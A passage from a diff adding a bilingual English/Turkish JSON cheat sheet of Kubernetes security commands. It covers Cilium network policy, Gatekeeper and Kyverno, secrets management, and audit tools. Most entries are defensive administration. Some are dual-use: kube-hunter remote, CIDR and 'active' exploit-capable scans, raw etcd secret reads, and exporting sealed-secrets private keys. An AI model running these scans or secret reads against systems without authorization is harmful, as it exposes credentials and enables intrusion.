+            "desc": "Use Hubble to observe dropped and forwarded flows for a pod",
+            "desc_tr": "Bir pod icin dusurulen ve iletilen akislari Hubble ile gozlemle",
+            "cmd": "hubble observe --namespace <NAMESPACE> --pod <POD> --verdict DROPPED -f",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Enable Hubble UI",
+            "desc": "Enable Hubble and open its web UI for flow visualization",
+            "desc_tr": "Hubble'i etkinlestir ve akis gorsellestirme web arayuzunu ac",
+            "cmds": [
+              "cilium hubble enable --ui",
+              "cilium hubble ui"
+            ],
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Trace Policy Verdict for a Flow",
+            "desc": "Ask Cilium whether traffic between two identities would be allowed",
+            "desc_tr": "Cilium'a iki kimlik arasindaki trafige izin verilip verilmeyecegini sor",
+            "cmd": "kubectl -n kube-system exec ds/cilium -- cilium policy trace --src-identity <SRC_ID> --dst-identity <DST_ID> --dport <PORT>/TCP",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Audit Effective Policy on Endpoint",
+            "desc": "Dump the enforced ingress/egress policy map for a specific endpoint",
+            "desc_tr": "Belirli bir endpoint icin uygulanan ingress/egress policy haritasini dok",
+            "cmd": "kubectl -n kube-system exec ds/cilium -- cilium endpoint get <ENDPOINT_ID> -o jsonpath='{[0].status.policy}'",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Enable Policy Audit Mode",
+            "desc": "Run Cilium policy in non-enforcing audit mode to log would-be drops",
+            "desc_tr": "Engellenecek trafigi yalnizca loglamak icin Cilium policy'sini denetim (audit) modunda calistir",
+            "cmd": "kubectl -n kube-system exec ds/cilium -- cilium endpoint config <ENDPOINT_ID> PolicyAuditMode=Enabled",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Audit modu uretim oncesi yeni policy'leri test etmek icin idealdir; trafik engellenmez, yalnizca denetim olaylari uretilir."
+          },
+          {
+            "title": "Verify Policies Affecting a Pod",
+            "desc": "Find which NetworkPolicies select a given pod by its labels",
+            "desc_tr": "Belirli bir pod'u etiketlerine gore hangi NetworkPolicy'lerin sectigini bul",
+            "cmd": "kubectl get netpol -n <NAMESPACE> -o yaml | grep -A8 podSelector",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Generate Policies with Network Policy Advisor",
+            "desc": "Auto-generate NetworkPolicies from observed traffic using Inspektor Gadget",
+            "desc_tr": "Inspektor Gadget ile gozlemlenen trafikten otomatik NetworkPolicy uret",
+            "cmd": "kubectl gadget advise network-policy monitor -n <NAMESPACE> --output ./policy.yaml",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Validate Cluster Policies with Netassert",
+            "desc": "Run declarative connectivity assertions to test that policies behave as intended",
+            "desc_tr": "Policy'lerin amaclandigi gibi davrandigini test etmek icin bildirimsel baglanti dogrulamalari calistir",
+            "cmd": "netassert test.yaml",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Delete a Network Policy",
+            "desc": "Remove a NetworkPolicy from a namespace",
+            "desc_tr": "Bir namespace'ten NetworkPolicy'yi kaldir",
+            "cmd": "kubectl delete networkpolicy <NAME> -n <NAMESPACE>",
+            "tags": [
+              "essential"
+            ]
+          }
+        ]
+      },
+      {
+        "name": "Policy as Code (OPA Gatekeeper, Kyverno)",
+        "commands": [
+          {
+            "title": "Install Gatekeeper via Helm",
+            "desc": "Install OPA Gatekeeper using the official Helm chart",
+            "desc_tr": "OPA Gatekeeper'i resmi Helm chart ile kur",
+            "cmd": "helm install gatekeeper gatekeeper/gatekeeper --namespace gatekeeper-system --create-namespace",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "Once 'helm repo add gatekeeper https://open-policy-agent.github.io/gatekeeper/charts' eklenmeli."
+          },
+          {
+            "title": "Apply Gatekeeper Release Manifest",
+            "desc": "Deploy Gatekeeper directly from the upstream release YAML",
+            "desc_tr": "Gatekeeper'i upstream release YAML'inden dogrudan dagit",
+            "cmd": "kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.16/deploy/gatekeeper.yaml",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "List ConstraintTemplates",
+            "desc": "Show all installed Gatekeeper ConstraintTemplate CRDs",
+            "desc_tr": "Kurulu tum Gatekeeper ConstraintTemplate CRD'lerini listele",
+            "cmd": "kubectl get constrainttemplates",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "List All Constraints",
+            "desc": "Enumerate every active constraint across all kinds",
+            "desc_tr": "Tum turlerdeki etkin kisitlamalari (constraint) listele",
+            "cmd": "kubectl get constraints -A",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Inspect Constraint Violations",
+            "desc": "View violations recorded in a constraint's status field",
+            "desc_tr": "Bir kisitlamanin status alanindaki ihlalleri goruntule",
+            "cmd": "kubectl get <CONSTRAINT_KIND> <NAME> -o jsonpath='{.status.violations}' | jq .",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Audit-Only Constraint Enforcement",
+            "desc": "Set enforcementAction to dryrun to audit without blocking",
+            "desc_tr": "Engellemeden denetlemek icin enforcementAction'i dryrun yap",
+            "cmd": "kubectl patch <CONSTRAINT_KIND> <NAME> --type=merge -p '{\"spec\":{\"enforcementAction\":\"dryrun\"}}'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Gecerli degerler: deny, dryrun, warn. Production'a deny'dan once dryrun ile test edin."
+          },
+          {
+            "title": "Test Rego Policy with OPA",
+            "desc": "Run unit tests for Rego policies locally with the opa CLI",
+            "desc_tr": "Rego politikalarini opa CLI ile yerelde birim testten gecir",
+            "cmd": "opa test <PATH>/ -v",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Evaluate Rego Against Input",
+            "desc": "Evaluate a Rego query against an input JSON document",
+            "desc_tr": "Bir Rego sorgusunu input JSON belgesine karsi degerlendir",
+            "cmd": "opa eval -i <FILE>.json -d <PATH>/policy.rego 'data.k8svalidation.violation'",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Format and Lint Rego",
+            "desc": "Auto-format Rego source files in place",
+            "desc_tr": "Rego kaynak dosyalarini yerinde otomatik bicimlendir",
+            "cmd": "opa fmt -w <PATH>/policy.rego",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "View Gatekeeper Audit Logs",
+            "desc": "Tail the Gatekeeper audit controller logs",
+            "desc_tr": "Gatekeeper audit controller loglarini takip et",
+            "cmd": "kubectl logs -n gatekeeper-system -l control-plane=audit-controller -f",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Sync Resources into OPA Cache",
+            "desc": "Create a Config to replicate cluster data for cross-object policies",
+            "desc_tr": "Nesneler-arasi politikalar icin kume verisini Config ile cogalt",
+            "cmd": "kubectl apply -f config-sync.yaml -n gatekeeper-system",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Uniqueness gibi kurallar icin sync.syncOnly altinda kaynak gruplari tanimlanmali."
+          },
+          {
+            "title": "Install Kyverno via Helm",
+            "desc": "Install Kyverno policy engine with the official Helm chart",
+            "desc_tr": "Kyverno politika motorunu resmi Helm chart ile kur",
+            "cmd": "helm install kyverno kyverno/kyverno --namespace kyverno --create-namespace",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "List Kyverno ClusterPolicies",
+            "desc": "Show all cluster-wide Kyverno policies and their status",
+            "desc_tr": "Kume genelindeki tum Kyverno politikalarini ve durumlarini listele",
+            "cmd": "kubectl get clusterpolicy",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "List Policy Reports",
+            "desc": "Enumerate Kyverno PolicyReports showing pass/fail results",
+            "desc_tr": "Gecme/kalma sonuclarini gosteren Kyverno PolicyReport'lari listele",
+            "cmd": "kubectl get policyreport -A",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Inspect Failed Policy Results",
+            "desc": "Filter a PolicyReport for failing rule results",
+            "desc_tr": "Bir PolicyReport'ta basarisiz kural sonuclarini filtrele",
+            "cmd": "kubectl get policyreport -A -o json | jq '.items[].results[] | select(.result==\"fail\")'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Apply Pod Security Baseline Policies",
+            "desc": "Apply the Kyverno Pod Security Standards baseline policy set",
+            "desc_tr": "Kyverno Pod Security Standards baseline politika setini uygula",
+            "cmd": "kubectl apply -f https://raw.githubusercontent.com/kyverno/policies/main/pod-security/baseline/disallow-privileged-containers/disallow-privileged-containers.yaml",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Test Policies with Kyverno CLI",
+            "desc": "Run a declarative Kyverno test suite from a kyverno-test.yaml",
+            "desc_tr": "kyverno-test.yaml'den bildirimsel Kyverno test paketini calistir",
+            "cmd": "kyverno test <PATH>/",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Dry-Run a Resource Against a Policy",
+            "desc": "Apply a policy to a manifest offline to preview the verdict",
+            "desc_tr": "Bir politikayi manifest'e cevrimdisi uygulayip sonucu onizle",
+            "cmd": "kyverno apply <PATH>/policy.yaml --resource <FILE>.yaml",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Scan Cluster Resources Offline",
+            "desc": "Pipe live cluster resources into the Kyverno CLI for scanning",
+            "desc_tr": "Canli kume kaynaklarini taramak icin Kyverno CLI'ya akit",
+            "cmd": "kubectl get pods -n <NAMESPACE> -o yaml | kyverno apply <PATH>/policy.yaml --resource -",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Enforce Image Signature Verification",
+            "desc": "Block unsigned images via a Kyverno verifyImages policy",
+            "desc_tr": "Imzasiz imajlari Kyverno verifyImages politikasiyla engelle",
+            "cmd": "kubectl apply -f https://raw.githubusercontent.com/kyverno/policies/main/other/verify-image/verify-image.yaml",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Cosign public key veya keyless (Fulcio/Rekor) dogrulama ile birlikte calisir."
+          },
+          {
+            "title": "Generate Policy Report Summary",
+            "desc": "Count policy results grouped by pass/fail/warn",
+            "desc_tr": "Politika sonuclarini gecme/kalma/uyari olarak gruplayip say",
+            "cmd": "kubectl get policyreport -A -o json | jq -r '[.items[].summary] | {pass:(map(.pass)|add),fail:(map(.fail)|add)}'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Set Policy to Audit (Non-Blocking)",
+            "desc": "Change a ClusterPolicy validationFailureAction to Audit",
+            "desc_tr": "ClusterPolicy validationFailureAction degerini Audit'e cevir",
+            "cmd": "kubectl patch clusterpolicy <NAME> --type=merge -p '{\"spec\":{\"validationFailureAction\":\"Audit\"}}'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Yeni surumlerde alan spec.rules[].validate.failureAction altina tasindi (Enforce/Audit)."
+          },
+          {
+            "title": "Inspect ValidatingWebhookConfigurations",
+            "desc": "List admission webhooks registered by the policy engine",
+            "desc_tr": "Politika motorunun kaydettigi admission webhook'larini listele",
+            "cmd": "kubectl get validatingwebhookconfigurations | grep -E 'gatekeeper|kyverno'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Webhook failurePolicy=Fail ise engine cokerse tum admission istekleri bloke olabilir."
+          },
+          {
+            "title": "Audit Cluster with Conftest",
+            "desc": "Validate Kubernetes manifests against Rego policies using Conftest",
+            "desc_tr": "Kubernetes manifest'lerini Conftest ile Rego politikalarina karsi dogrula",
+            "cmd": "conftest test <FILE>.yaml -p <PATH>/policies/",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Check Gatekeeper Pod Health",
+            "desc": "Verify controller and audit pods are running",
+            "desc_tr": "Controller ve audit pod'larinin calistigini dogrula",
+            "cmd": "kubectl get pods -n gatekeeper-system",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Describe a ConstraintTemplate Schema",
+            "desc": "Show the Rego and parameter schema of a template",
+            "desc_tr": "Bir template'in Rego ve parametre semasini goruntule",
+            "cmd": "kubectl get constrainttemplate <NAME> -o yaml",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Mutate Resources with Kyverno",
+            "desc": "Apply a mutation policy to auto-inject defaults like labels",
+            "desc_tr": "Etiket gibi varsayilanlari otomatik eklemek icin mutasyon politikasi uygula",
+            "cmd": "kubectl apply -f <PATH>/add-default-labels.yaml",
+            "tags": [
+              "advanced"
+            ],
+            "note": "mutate.patchStrategicMerge mevcut kaynaklara mutateExistingOnPolicyUpdate ile de uygulanabilir."
+          }
+        ]
+      },
+      {
+        "name": "Secrets Security (sealed-secrets, external-secrets, encryption at rest)",
+        "commands": [
+          {
+            "title": "Create Generic Secret from Literals",
+            "desc": "Create a Kubernetes Secret directly from literal key-value pairs",
+            "desc_tr": "Düz anahtar-değer çiftlerinden doğrudan bir Kubernetes Secret oluştur",
+            "cmd": "kubectl create secret generic <SECRET> --from-literal=username=admin --from-literal=password=<PASS> -n <NAMESPACE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Generate Secret Manifest Without Applying",
+            "desc": "Render a Secret YAML to file using dry-run for GitOps review",
+            "desc_tr": "GitOps incelemesi için dry-run ile bir Secret YAML dosyasını uygulamadan üret",
+            "cmd": "kubectl create secret generic <SECRET> --from-file=<FILE> --dry-run=client -o yaml > secret.yaml",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Decode a Secret Value",
+            "desc": "Read and base64-decode a single key from an existing Secret",
+            "desc_tr": "Mevcut bir Secret'tan tek bir anahtarı okuyup base64 çöz",
+            "cmd": "kubectl get secret <SECRET> -n <NAMESPACE> -o jsonpath='{.data.password}' | base64 -d",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Install kubeseal CLI (Sealed Secrets)",
+            "desc": "Download the kubeseal client used to encrypt secrets for the controller",
+            "desc_tr": "Controller için secret'ları şifrelemekte kullanılan kubeseal istemcisini indir",
+            "cmd": "KUBESEAL_VERSION=0.27.1; curl -sL \"https://github.com/bitnami-labs/sealed-secrets/releases/download/v${KUBESEAL_VERSION}/kubeseal-${KUBESEAL_VERSION}-linux-amd64.tar.gz\" | tar xz kubeseal && sudo install kubeseal /usr/local/bin/",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Install Sealed Secrets Controller",
+            "desc": "Deploy the bitnami-labs Sealed Secrets controller via Helm",
+            "desc_tr": "bitnami-labs Sealed Secrets controller'ını Helm ile dağıt",
+            "cmd": "helm repo add sealed-secrets https://bitnami-labs.github.io/sealed-secrets && helm install sealed-secrets sealed-secrets/sealed-secrets -n kube-system",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Seal a Secret with kubeseal",
+            "desc": "Encrypt a plain Secret into a SealedSecret safe to commit to Git",
+            "desc_tr": "Düz bir Secret'ı Git'e güvenle commit edilebilen bir SealedSecret'a şifrele",
+            "cmd": "kubeseal --controller-namespace kube-system --format yaml < secret.yaml > sealed-secret.yaml",
+            "tags": [
+              "tool",
+              "essential"
+            ],
+            "note": "The SealedSecret can only be decrypted by the controller in the target cluster; safe for public repos."
+          },
+          {
+            "title": "Fetch the Sealing Public Certificate",
+            "desc": "Export the controller public cert for offline sealing without cluster access",
+            "desc_tr": "Cluster erişimi olmadan çevrimdışı sealing için controller açık sertifikasını dışa aktar",
+            "cmd": "kubeseal --controller-namespace kube-system --fetch-cert > pub-cert.pem",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Seal Offline Using a Saved Cert",
+            "desc": "Encrypt a Secret offline using a pre-fetched public certificate",
+            "desc_tr": "Önceden alınmış açık sertifika ile bir Secret'ı çevrimdışı şifrele",
+            "cmd": "kubeseal --cert pub-cert.pem --format yaml < secret.yaml > sealed-secret.yaml",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Seal a Raw Value (One Field)",
+            "desc": "Encrypt a single raw value scoped to a namespace and secret name",
+            "desc_tr": "Bir namespace ve secret adına kapsamlanmış tek bir ham değeri şifrele",
+            "cmd": "echo -n <PASS> | kubeseal --raw --namespace <NAMESPACE> --name <SECRET> --cert pub-cert.pem",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Back Up Sealed Secrets Encryption Keys",
+            "desc": "Export the controller's private keys for disaster recovery",
+            "desc_tr": "Felaket kurtarma için controller'ın özel anahtarlarını dışa aktar",
+            "cmd": "kubectl get secret -n kube-system -l sealedsecrets.bitnami.com/sealed-secrets-key -o yaml > sealed-secrets-keys.yaml",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Store this backup securely offline; losing these keys makes all existing SealedSecrets undecryptable."
+          },
+          {
+            "title": "Restore Sealed Secrets Keys & Restart",
+            "desc": "Re-apply backed-up keys and restart the controller to adopt them",
+            "desc_tr": "Yedeklenen anahtarları yeniden uygula ve controller'ı yeniden başlatarak benimset",
+            "cmd": "kubectl apply -f sealed-secrets-keys.yaml && kubectl delete pod -n kube-system -l name=sealed-secrets",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Install External Secrets Operator",
+            "desc": "Deploy ESO via Helm with CRDs to sync from external secret stores",
+            "desc_tr": "Dış secret store'larından senkronizasyon için ESO'yu CRD'lerle Helm üzerinden dağıt",
+            "cmd": "helm repo add external-secrets https://charts.external-secrets.io && helm install external-secrets external-secrets/external-secrets -n external-secrets --create-namespace --set installCRDs=true",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Define a SecretStore (AWS SM)",
+            "desc": "Create a namespaced SecretStore pointing ESO at AWS Secrets Manager",
+            "desc_tr": "ESO'yu AWS Secrets Manager'a yönlendiren namespace'e özgü bir SecretStore oluştur",
+            "cmd": "kubectl apply -f secretstore-aws.yaml -n <NAMESPACE>",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Use ClusterSecretStore (cluster-scoped) instead of SecretStore when many namespaces share one provider."
+          },
+          {
+            "title": "Create an ExternalSecret Resource",
+            "desc": "Map remote keys into a synced Kubernetes Secret via ESO",
+            "desc_tr": "ESO aracılığıyla uzak anahtarları senkronize bir Kubernetes Secret'a eşle",
+            "cmd": "kubectl apply -f externalsecret.yaml -n <NAMESPACE>",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Check ExternalSecret Sync Status",
+            "desc": "Inspect ExternalSecret readiness and the last sync result",
+            "desc_tr": "ExternalSecret hazırlık durumunu ve son senkronizasyon sonucunu incele",
+            "cmd": "kubectl get externalsecret -n <NAMESPACE> -o wide",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Force an ExternalSecret Refresh",
+            "desc": "Trigger an immediate re-sync by bumping the force-sync annotation",
+            "desc_tr": "force-sync anotasyonunu güncelleyerek anında yeniden senkronizasyon tetikle",
+            "cmd": "kubectl annotate externalsecret <SECRET> -n <NAMESPACE> force-sync=$(date +%s) --overwrite",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Debug ESO Reconciliation Events",
+            "desc": "Read events and conditions on a failing ExternalSecret",
+            "desc_tr": "Başarısız bir ExternalSecret üzerindeki olayları ve koşulları oku",
+            "cmd": "kubectl describe externalsecret <SECRET> -n <NAMESPACE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Generate EncryptionConfiguration (AES-GCM)",
+            "desc": "Create a random 32-byte key and embed it in an EncryptionConfiguration",
+            "desc_tr": "Rastgele 32 baytlık bir anahtar üret ve bir EncryptionConfiguration'a göm",
+            "cmd": "head -c 32 /dev/urandom | base64",
+            "tags": [
+              "advanced",
+              "essential"
+            ],
+            "note": "Place the EncryptionConfiguration file on control-plane nodes and reference it via --encryption-provider-config in the kube-apiserver."
+          },
+          {
+            "title": "Enable Encryption at Rest on kube-apiserver",
+            "desc": "Point the API server at the encryption provider config flag",
+            "desc_tr": "API sunucusunu encryption provider config bayrağına yönlendir",
+            "cmd": "grep -- '--encryption-provider-config' /etc/kubernetes/manifests/kube-apiserver.yaml",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Edit the static pod manifest to add --encryption-provider-config=/etc/kubernetes/enc/enc.yaml; kubelet restarts the apiserver automatically."
+          },
+          {
+            "title": "Verify a Secret Is Encrypted in etcd",
+            "desc": "Read a raw secret from etcd to confirm it is not stored in plaintext",
+            "desc_tr": "Bir secret'ın etcd'de düz metin olarak saklanmadığını doğrulamak için ham olarak oku",
+            "cmd": "ETCDCTL_API=3 etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get /registry/secrets/<NAMESPACE>/<SECRET> | hexdump -C | head",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Encrypted entries begin with the prefix k8s:enc:aescbc: or k8s:enc:aesgcm:; plaintext shows readable values."
+          },
+          {
+            "title": "Re-encrypt All Existing Secrets",
+            "desc": "Force a rewrite so previously stored secrets adopt the new encryption key",
+            "desc_tr": "Önceden saklanan secret'ların yeni şifreleme anahtarını benimsemesi için yeniden yazmaya zorla",
+            "cmd": "kubectl get secrets --all-namespaces -o json | kubectl replace -f -",
+            "tags": [
+              "advanced",
+              "essential"
+            ],
+            "note": "Run this after enabling/rotating encryption; existing secrets stay unencrypted in etcd until rewritten."
+          },
+          {
+            "title": "Audit RBAC Access to Secrets",
+            "desc": "List subjects allowed to read Secrets in a namespace",
+            "desc_tr": "Bir namespace'te Secret okuyabilen subject'leri listele",
+            "cmd": "kubectl auth can-i get secrets --as=system:serviceaccount:<NAMESPACE>:<SECRET> -n <NAMESPACE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Find Secrets Exposed via Pod Env Vars",
+            "desc": "List pods that inject Secrets as environment variables (riskier than volumes)",
+            "desc_tr": "Secret'ları ortam değişkeni olarak enjekte eden pod'ları listele (volume'lardan daha riskli)",
+            "cmd": "kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{\"/\"}{.metadata.name}{\"\\t\"}{.spec.containers[*].envFrom[*].secretRef.name}{\"\\n\"}{end}'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Scan Manifests for Hardcoded Secrets",
+            "desc": "Use trivy to detect plaintext secrets in Kubernetes YAML",
+            "desc_tr": "Kubernetes YAML içindeki düz metin secret'ları tespit etmek için trivy kullan",
+            "cmd": "trivy config --severity HIGH,CRITICAL <PATH>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Detect Secrets in Git History",
+            "desc": "Run gitleaks to catch committed secrets before they reach the cluster",
+            "desc_tr": "Cluster'a ulaşmadan önce commit edilmiş secret'ları yakalamak için gitleaks çalıştır",
+            "cmd": "gitleaks detect --source <PATH> --report-format sarif --report-path gitleaks.sarif",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Enable Secret Encryption with KMS Plugin",
+            "desc": "Inspect the KMS v2 provider block for envelope encryption via external KMS",
+            "desc_tr": "Dış KMS ile zarf şifrelemesi için KMS v2 provider bloğunu incele",
+            "cmd": "grep -A5 'kms:' /etc/kubernetes/enc/enc.yaml",
+            "tags": [
+              "advanced"
+            ],
+            "note": "KMS v2 (stable in 1.29+) is preferred over static aescbc/aesgcm keys since the data-encryption key never lives in the config file."
+          }
+        ]
+      },
+      {
+        "name": "Benchmarks & Audit (kube-bench, kube-hunter, kubeaudit, Polaris)",
+        "commands": [
+          {
+            "title": "kube-bench Run All Targets",
+            "desc": "Run CIS Kubernetes Benchmark checks against master and node",
+            "desc_tr": "CIS Kubernetes Benchmark kontrollerini master ve node hedeflerine karsi calistir",
+            "cmd": "kube-bench run --targets master,node,etcd,policies",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "kube-bench Auto-Detect Version",
+            "desc": "Pin a specific CIS benchmark version explicitly",
+            "desc_tr": "Belirli bir CIS benchmark surumunu acikca sabitle",
+            "cmd": "kube-bench run --benchmark cis-1.9",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "Use --benchmark to pin a CIS version (cis-1.8, cis-1.9, gke-1.6, eks-1.5, aks-1.0) when auto-detection fails."
+          },
+          {
+            "title": "kube-bench JSON Output",
+            "desc": "Output benchmark results as JSON for pipelines",
+            "desc_tr": "Benchmark sonuclarini pipeline'lar icin JSON olarak ciktila",
+            "cmd": "kube-bench run --targets master,node --json > kube-bench-report.json",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "kube-bench Run as Docker (Host Mount)",
+            "desc": "Run kube-bench from its container against the host",
+            "desc_tr": "kube-bench'i kendi konteynerinden host'a karsi calistir",
+            "cmd": "docker run --rm --pid=host -v /etc:/etc:ro -v /var:/var:ro -t aquasec/kube-bench:latest run --targets master,node",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "kube-bench as Kubernetes Job",
+            "desc": "Deploy kube-bench as a Job and read the scan from logs",
+            "desc_tr": "kube-bench'i Job olarak dagit ve taramayi loglardan oku",
+            "cmds": [
+              "kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml",
+              "kubectl logs job/kube-bench"
+            ],
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "kube-bench Filter Failed Checks Only",
+            "desc": "Show only failed CIS checks to prioritize remediation",
+            "desc_tr": "Onceliklendirme icin yalnizca basarisiz CIS kontrollerini goster",
+            "cmd": "kube-bench run --targets master,node | grep -E '^\\[FAIL\\]'",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "kube-bench Specific Check IDs",
+            "desc": "Run only specific CIS check IDs",
+            "desc_tr": "Yalnizca belirli CIS kontrol ID'lerini calistir",
+            "cmd": "kube-bench run --targets master --check 1.2.1,1.2.2",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "kube-bench Skip Checks",
+            "desc": "Skip noisy or non-applicable check IDs",
+            "desc_tr": "Gurultulu veya uygulanamayan kontrol ID'lerini atla",
+            "cmd": "kube-bench run --targets master,node --skip 1.1.1,1.1.2",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "kube-hunter Remote Scan",
+            "desc": "Scan a remote cluster IP for exposed attack surface",
+            "desc_tr": "Uzak bir kume IP'sini acik saldiri yuzeyi icin tara",
+            "cmd": "kube-hunter --remote <TARGET_IP>",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "kube-hunter CIDR Network Scan",
+            "desc": "Scan an entire CIDR range for Kubernetes nodes",
+            "desc_tr": "Kubernetes node'lari icin tum bir CIDR araligini tara",
+            "cmd": "kube-hunter --cidr <TARGET_IP>/24",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "kube-hunter Internal (Pod) Scan",
+            "desc": "Scan from inside the cluster to find pod-reachable issues",
+            "desc_tr": "Pod'dan erisilebilen sorunlari bulmak icin kume icinden tara",
+            "cmd": "kube-hunter --interface --internal",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "kube-hunter Active Hunting",
+            "desc": "Enable active hunting which may exploit found vulnerabilities",
+            "desc_tr": "Bulunan zafiyetleri istismar edebilen aktif avlanmayi etkinlestir",
+            "cmd": "kube-hunter --remote <TARGET_IP> --active",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Active mode can modify cluster state (e.g. create pods). Only use with authorization in non-production."
+          },
+          {
+            "title": "kube-hunter JSON Report",
+            "desc": "Produce a machine-readable JSON report",
+            "desc_tr": "Makine tarafindan okunabilir JSON raporu uret",
+            "cmd": "kube-hunter --remote <TARGET_IP> --report json --log none",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "kube-hunter as Pod in Cluster",
+            "desc": "Run kube-hunter as a job inside the cluster",
+            "desc_tr": "kube-hunter'i kume icinde bir job olarak calistir",
+            "cmds": [
+              "kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-hunter/main/job.yaml",
+              "kubectl logs -f job/kube-hunter"
+            ],
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "kube-hunter List Available Tests",
+            "desc": "List all hunters/tests kube-hunter can perform",
+            "desc_tr": "kube-hunter'in yapabilecegi tum hunter/testleri listele",
+            "cmd": "kube-hunter --list --active",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "kubeaudit Audit All (autodetect)",
+            "desc": "Run all kubeaudit checks against the current kubeconfig context",
+            "desc_tr": "Tum kubeaudit kontrollerini mevcut kubeconfig context'ine karsi calistir",
+            "cmd": "kubeaudit all",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "kubeaudit Audit a Manifest File",
+            "desc": "Audit a local manifest file without a live cluster",
+            "desc_tr": "Canli kume olmadan yerel bir manifest dosyasini denetle",
+            "cmd": "kubeaudit all -f <FILE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "kubeaudit Privileged Containers",
+            "desc": "Check specifically for privileged containers",
+            "desc_tr": "Ozellikle ayricalikli (privileged) konteynerleri kontrol et",
+            "cmd": "kubeaudit privileged -n <NAMESPACE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "kubeaudit RunAsNonRoot Check",
